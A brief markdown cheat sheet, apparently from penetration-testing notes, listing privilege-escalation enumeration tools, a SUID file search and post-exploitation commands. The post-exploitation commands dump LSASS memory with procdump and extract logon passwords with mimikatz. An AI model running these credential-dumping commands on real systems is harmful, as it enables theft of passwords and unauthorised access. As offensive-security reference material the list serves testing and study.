## System Attack Techniques

### Privilege Escalation
* Linux enumeration
        * `linpeas.sh`
* Windows enumeration
        * `winPEAS.exe`
* SUID files search
        * `find / -perm -u=s -type f 2>/dev/null`

### Post Exploitation
* Memory dump
        * `procdump.exe -ma lsass.exe lsass.dmp`
* Password dump
        * `mimikatz.exe "sekurlsa::logonpasswords""